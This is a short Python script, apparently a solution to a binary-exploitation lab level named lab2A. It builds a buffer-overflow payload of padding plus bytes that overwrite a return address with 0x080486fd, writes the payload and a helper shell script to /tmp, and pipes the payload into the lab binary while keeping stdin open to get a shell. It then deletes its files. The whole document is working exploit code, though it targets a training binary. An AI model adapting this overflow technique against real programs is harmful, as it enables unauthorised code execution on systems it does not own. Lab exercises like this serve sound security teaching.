import os
payload=b''
for i in range(ord('A'),ord('L')+1):
        payload+=(chr(i)*16).encode()+b"\n"
payload+=b"\xfd"+b"M"*14+b"\x86"+b"\n" #Target:0x080486fd
payload+=b"\x04"+b"N"*14+b"\x08"+b"\n"
#write payload to a file
f=open("/tmp/payload","wb")
f.write(payload)
f.close()
#write shell script
exploit=open("/tmp/lab2A.sh",'w')
exploit.write("(cat /tmp/payload ;cat) | /levels/lab02/lab2A")
exploit.close()
#Exploit
os.system('chmod +x /tmp/lab2A.sh; /tmp/lab2A.sh')
#Clear
os.system('rm -f /tmp/payload /tmp/lab2A.sh')
